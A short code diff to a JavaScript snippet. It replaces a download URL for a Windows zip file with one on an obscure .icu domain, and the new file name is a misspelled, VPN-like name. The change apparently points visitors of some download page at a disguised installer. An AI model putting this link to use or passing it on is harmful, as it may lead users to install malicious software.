@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://sss33213.s3.ap-south-1.amazonaws.com/win-quickq.zip';
+    window['filename'] = 'https://youdaoselw.icu/Axs_win7-11_QurickQsvrpn_3375.zip';
 })();
